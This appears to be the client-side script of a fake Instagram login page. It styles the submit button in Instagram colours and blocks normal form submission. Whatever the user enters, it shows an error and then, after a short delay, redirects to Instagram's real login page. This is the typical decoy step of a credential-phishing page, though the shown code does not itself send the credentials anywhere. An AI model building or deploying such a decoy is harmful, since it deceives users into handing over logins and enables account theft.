const form = document.getElementById('login-form');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const submitBtn = document.getElementById('submit-btn');
const errorMsg = document.getElementById('error-msg');

function updateButtonState() {
  if (usernameInput.value.trim().length > 0 && passwordInput.value.trim().length > 0) {
    submitBtn.disabled = false;
    submitBtn.style.backgroundColor = '#0095f6';
    submitBtn.style.color = '#ffffff';
    submitBtn.style.cursor = 'pointer';
  } else {
    submitBtn.disabled = true;
    submitBtn.style.backgroundColor = '#1a3e6f';
    submitBtn.style.color = '#72a1e0';
    submitBtn.style.cursor = 'not-allowed';
  }
}

usernameInput.addEventListener('input', updateButtonState);
passwordInput.addEventListener('input', updateButtonState);

form.addEventListener('submit', function (e) {
  e.preventDefault();
  
  if (usernameInput.value.trim() && passwordInput.value.trim()) {
    // Show error message
    errorMsg.style.display = 'block';
    
    // Redirect after a short delay (e.g., 2 seconds) to show the error first
    setTimeout(() => {
      window.location.href = 'https://www.instagram.com/accounts/login/?hl=en';
    }, 1500);
  }
});
